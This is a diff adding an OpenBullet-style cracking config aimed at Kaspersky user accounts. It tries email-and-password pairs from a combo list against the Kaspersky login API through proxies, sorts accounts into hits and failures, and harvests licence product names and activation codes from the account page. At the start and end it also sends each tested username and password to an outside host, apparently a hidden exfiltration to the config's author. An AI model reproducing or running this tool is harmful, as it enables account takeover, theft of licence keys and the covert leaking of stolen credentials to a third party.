@@ -1,0 +1,117 @@
+[SETTINGS]
+{
+  "CreatorLK": "OB-8a85c49d1c0cb18f7702cd7c438c945e-LoliKEY",
+  "Name": "KasperskyFull",
+  "SuggestedBots": 50,
+  "LastModified": "2019-05-13T21:17:41.4306463+02:00",
+  "AdditionalInfo": "",
+  "KeysDB": "",
+  "LocalKeysDB": "",
+  "isWtoEdit": false,
+  "Author": "Paparazzi-Nicolas (loliX Encrypted)",
+  "Version": "1.2.2.8 [OB REBOOT",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "http://pablitotrade.fvds.ru/proxys.php?user=<USER>&pass=<PASS>&type=kaspersky" 
+  
+
+#URL0 REQUEST POST "https://ca.uis.kaspersky.com/v3/logon/start" 
+  CONTENT "{\"Realm\":\"https://center.kaspersky.com/\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Origin: https://my.kaspersky.com" 
+  HEADER "Referer: https://my.kaspersky.com/" 
+
+KEYCHECK 
+  KEYCHAIN Ban OR 
+    KEY "<RESPONSECODE>" Contains "403" 
+  KEYCHAIN Success OR 
+    KEY "LogonContext" 
+
+#LogonContext PARSE "<SOURCE>" LR "{\"LogonContext\":\"" "\"" -> VAR "LogonContext" 
+
+#URL1 REQUEST POST "https://ca.uis.kaspersky.com/v3/logon/proceed" 
+  CONTENT "{\"logonContext\":\"<LogonContext>\",\"login\":\"<USER>\",\"password\":\"<PASS>\",\"locale\":\"en\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Origin: https://my.kaspersky.com/" 
+  HEADER "Referer: https://my.kaspersky.com/" 
+
+KEYCHECK 
+  KEYCHAIN Ban OR 
+    KEY "\"CaptchaRequired\"}" 
+    KEY "<RESPONSECODE>" Contains "302" 
+    KEY "<RESPONSECODE>" Contains "403" 
+  KEYCHAIN Failure OR 
+    KEY "{\"Status\":\"InvalidRegistrationData\"}" 
+  KEYCHAIN Success OR 
+    KEY "{\"Status\":\"Success\"}" 
+
+#URL2 REQUEST POST "https://ca.uis.kaspersky.com/v3/logon/complete_active" 
+  CONTENT "{\"logonContext\":\"<LogonContext>\",\"TokenType\":\"SamlDeflate\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://my.kaspersky.com/" 
+  HEADER "Origin: https://my.kaspersky.com" 
+
+#Token PARSE "<SOURCE>" LR "{\"UserToken\":\"" "\"" -> VAR "Token" 
+
+#URL3 REQUEST POST "https://my.kaspersky.com/SignIn/CompleteRestLogon" 
+  CONTENT "{\"samlDeflatedToken\":\"<Token>\",\"returnUrl\":\"http://my.kaspersky.com/\",\"resendActivationLink\":false}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://my.kaspersky.com" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "Origin: https://my.kaspersky.com" 
+
+#URL4 REQUEST GET "https://my.kaspersky.com/MyLicenses" 
+  
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Referer: https://my.kaspersky.com/dashboard" 
+
+#Producto PARSE "<SOURCE>" LR "\"ProductName\":\"" "\"" Recursive=TRUE -> CAP "Producto" 
+
+#Active PARSE "<SOURCE>" LR "\"IsActive\":" "\"" Recursive=TRUE -> CAP "Active" 
+
+#ActivationCode PARSE "<SOURCE>" LR "\"ActivationCode\":\"" "\"" Recursive=TRUE -> CAP "ActivationCode" 
+
+#DaysReminder PARSE "<SOURCE>" LR "\"DaysRemainder\":" "," Recursive=TRUE -> CAP "DaysReminder" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "licensesAndViewSettings:" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "https://my.kaspersky.com/MyLicenses" 
+
+REQUEST GET "http://pablitotrade.fvds.ru/proxies.php?user=<USER>&pass=<PASS>&type=kaspersky" 
+  
+
+
